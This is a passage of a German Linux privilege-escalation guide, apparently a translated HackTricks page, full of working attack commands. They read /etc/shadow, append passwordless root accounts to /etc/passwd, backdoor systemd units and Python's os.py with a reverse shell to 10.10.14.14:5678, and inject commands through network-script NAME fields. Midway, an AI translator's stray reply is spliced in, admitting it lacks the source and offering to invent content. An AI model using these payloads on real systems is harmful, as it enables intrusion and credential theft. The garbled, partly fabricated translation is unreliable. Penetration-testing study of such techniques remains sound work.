Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher, wenn du eine dieser Dateien **schreiben oder ändern kannst, kannst du Privilegien eskalieren**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein merkwürdiges Profile-Skript gefunden wird, solltest du es auf **sensible Details** überprüfen.

### Passwd/Shadow Dateien

Je nach OS könnten die Dateien `/etc/passwd` und `/etc/shadow` unter einem anderen Namen existieren oder es könnte ein Backup geben. Deshalb wird empfohlen, **alle zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob Hashes** in den Dateien enthalten sind:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In manchen Fällen findet man **password hashes** in der Datei `/etc/passwd` (oder einer äquivalenten).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Beschreibbares /etc/passwd

Erzeuge zunächst ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ich habe die Anweisung verstanden, aber ich habe den Inhalt von src/linux-hardening/privilege-escalation/README.md nicht erhalten. Bitte liefere den Originaltext (die README.md), den ich ins Deutsche übersetzen soll.

Außerdem: Soll ich in die übersetzte Datei explizit eine Sektion hinzufügen, die erklärt, wie der Benutzer `hacker` angelegt wird, und das generierte Passwort in Klartext in der Datei aufführen? Oder möchtest du stattdessen nur die Shell-Befehle, um den Benutzer anzulegen und ein sicheres Passwort zu erzeugen (welches ich dann hier ausgeben würde)?

Gib kurz Bescheid:
- Füge die Datei hier ein, oder bestätige, dass ich einen typischen README-Inhalt erstellen soll.
- Soll das Passwort in der Datei stehen (sichtbar) oder nur als Vorschlag/Befehl zurückgegeben werden?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst jetzt den `su`-Befehl mit `hacker:hacker` verwenden

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Dadurch kann die Sicherheit der Maschine beeinträchtigt werden.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`, außerdem wird `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du **in einige sensible Dateien schreiben** kannst. Zum Beispiel: Kannst du in eine **Service-Konfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel, wenn die Maschine einen **tomcat**-Server ausführt und du die **Tomcat-Service-Konfigurationsdatei in /etc/systemd/** ändern kannst, dann kannst du die folgenden Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner prüfen

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich wirst du das letzte nicht lesen können, aber versuche es.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Seltsamer Speicherort/Owned Dateien
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binaries im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-Dateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

Lies den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), er durchsucht **mehrere mögliche Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), eine Open-Source-Anwendung, die verwendet wird, um viele auf einem lokalen Computer für Windows, Linux & Mac gespeicherte Passwörter abzurufen.

### Logs

Wenn du logs lesen kannst, könntest du darin **interessante/vertrauliche Informationen** finden. Je seltsamer das log ist, desto interessanter wird es (wahrscheinlich).\
Außerdem können einige "**schlecht**" konfigurierte (backdoored?) **audit logs** es dir ermöglichen, **Passwörter aufzuzeichnen** in audit logs, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/].
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um **Logs zu lesen** ist die Gruppe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Du solltest auch nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, und außerdem nach IPs und emails in logs oder nach hashes regexps.\
Ich werde hier nicht aufzählen, wie man das alles macht, aber wenn du interessiert bist, kannst du dir die letzten Prüfungen ansehen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) durchführt.

## Beschreibbare Dateien

### Python library hijacking

Wenn du weißt, **wo** ein python script ausgeführt werden wird und du **in diesen Ordner schreiben kannst** oder du **python libraries verändern kannst**, kannst du die OS library modifizieren und mit einer backdoor versehen (wenn du an den Ort schreiben kannst, an dem das python script ausgeführt wird, kopiere und füge die os.py library ein).

Um **backdoor the library** füge einfach am Ende der os.py library die folgende Zeile hinzu (ändere IP und PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate-Ausnutzung

Eine Schwachstelle in `logrotate` erlaubt Benutzern mit **Schreibberechtigungen** auf eine Logdatei oder ihre übergeordneten Verzeichnisse, möglicherweise erhöhte Privilegien zu erlangen. Das liegt daran, dass `logrotate`, das oft als **root** läuft, so manipuliert werden kann, dass es beliebige Dateien ausführt, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in allen Verzeichnissen, in denen Logrotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter

Mehr Informationen zur Schwachstelle finden sich auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Diese Schwachstelle kann mit [**logrotten**](https://github.com/whotwagner/logrotten) ausgenutzt werden.

Diese Schwachstelle ist der [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** sehr ähnlich, daher solltest du, sobald du Logs verändern kannst, prüfen, wer diese Logs verwaltet, und ob du Privilegien eskalieren kannst, indem du die Logs durch Symlinks ersetzt.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Verweis auf die Verwundbarkeit:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn aus welchem Grund auch immer ein Benutzer ein `ifcf-<whatever>`-Skript nach _/etc/sysconfig/network-scripts_ **schreiben** kann **oder** ein bestehendes anpassen kann, dann ist dein **System pwned**.

Network-Skripte, z. B. _ifcg-eth0_, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI-Dateien aus. Allerdings werden sie auf Linux vom Network Manager (dispatcher.d) \~sourced\~.

In meinem Fall wird das `NAME=`-Attribut in diesen Network-Skripten nicht korrekt behandelt. Wenn du **Leer-/Blank-Zeichen im Namen** hast, **versucht das System, den Teil nach dem Leer-/Blank-Zeichen auszuführen**. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

Zum Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Hinweis: das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd, und rc.d**

Das Verzeichnis `/etc/init.d` ist der Ort für **Skripte** von System V init (SysVinit), dem **klassischen Linux-Service-Management-System**. Es enthält Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Services. Diese können direkt ausgeführt werden oder über symbolische Links in `/etc/rc?.d/`. Ein alternativer Pfad bei Redhat-Systemen ist `/etc/rc.d/init.d`.

Auf der anderen Seite ist `/etc/init` mit **Upstart** verbunden, einem neueren **Service-Management**, das von Ubuntu eingeführt wurde und Konfigurationsdateien für Service-Management-Aufgaben nutzt. Trotz der Umstellung auf Upstart werden SysVinit-Skripte weiterhin zusammen mit Upstart-Konfigurationen verwendet, aufgrund einer Kompatibilitätsschicht in Upstart.

**systemd** hat sich als moderner Init- und Service-Manager etabliert und bietet erweiterte Funktionen wie bedarfsgesteuerten Start von Daemons, Automount-Verwaltung und Snapshots des Systemzustands. Es organisiert Dateien in `/usr/lib/systemd/` für Distribution-Pakete und in `/etc/systemd/system/` für Administratoranpassungen und vereinfacht so die Systemadministration.

## Weitere Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hooken üblicherweise einen syscall, um privilegierte Kernel-Funktionalität einem Userspace-Manager zugänglich zu machen. Schwache Manager-Authentifizierung (z. B. Signature-Checks basierend auf FD-order oder schlechte Passwortschemata) kann einer lokalen App erlauben, den Manager zu imitieren und auf bereits gerooteten Geräten zur root zu eskalieren. Mehr Informationen und Exploit-Details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gesteuerte Service-Discovery in VMware Tools/Aria Operations kann einen Binary-Pfad aus Prozess-Command-Lines extrahieren und diesen mit -v in einem privilegierten Kontext ausführen. Zu permissive Patterns (z. B. die Verwendung von \S) können auf von Angreifern platzierten Listeners in beschreibbaren Verzeichnissen (z. B. /tmp/httpd) matchen und so zur Ausführung als root führen (CWE-426 Untrusted Search Path).

Mehr erfahren und ein generalisiertes Muster, das auf andere Discovery-/Monitoring-Stacks anwendbar ist, siehe hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Weitere Hilfe

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Bestes Tool, um Linux lokale privilege escalation Vektoren zu finden:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeriert Kernel-Sicherheitslücken in Linux und MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referenzen

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
